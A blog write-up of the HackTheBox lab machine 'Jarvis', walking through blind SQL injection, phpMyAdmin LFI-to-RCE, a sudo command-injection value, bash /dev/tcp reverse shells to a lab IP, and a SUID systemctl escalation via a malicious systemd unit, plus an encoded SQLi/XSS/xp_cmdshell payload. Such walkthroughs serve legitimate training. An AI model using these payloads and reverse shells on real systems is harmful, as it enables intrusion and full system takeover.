---
title: "HackTheBox - WriteUp 13"
date: 2019-07-13T22:31:09+08:00
description: "HackTheBox 练手 - Jarvis - SQLi+Systemd"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Jarvis

Nmap result: 22,80 with Apache and php.

SQLi Defender enabled, you should avoid `'` `"` `ORDER/order` `UNION/union` and also `9208%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23` in command within the request of `room.php?cod=`.

# User

Step 1: Sqli

`room.php?cod=1` Blind SQL Injection at param `cod`.

Step 2: RCE

`/phpadmin` use the credentials you just get `DBadmin:imissyou`, 

then follow the procedure here: https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/

Get the cookie value of phpmyadmin: 3u5vpovmecn9md1dl7du5a4cthnul6pt

The LFI: `http://127.0.0.1:9191/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_3u5vpovmecn9md1dl7du5a4cthnul6pt`

You'll get the shell or `www-data`.

```bash
$ sudo -l
(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
$ python3 -c "import pty;pty.spawn('/bin/sh')"
$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

Upload the prepared shell script and chmod 777.

```bash
#!/bin/sh
bash -c 'bash -i &>/dev/tcp/10.10.14.6/4455 0<&1'
```

Then input: `127.0.0.1$(/tmp/143.sh)`

Then you will have the user flag.

# Root

Check SUID file, found `/bin/systemctl`, then `mkdir -p ~/.config/systemd/user/`

Upload the preparde systemd service to `~/.config/systemd/user/`

The service file looks like:

```systemd
[Unit]
Description=Patrick's Telegram Bot Watchdog

[Service]
ExecStart=/bin/bash -c '/bin/bash -i &>/dev/tcp/10.10.14.6/4466 0<&1'

[Install]
WantedBy=multi-user.target
```

Then `systemctl enable --now ~/.config/systemd/user/fuckjarv4.service`

Then you have the root shell.

(END)
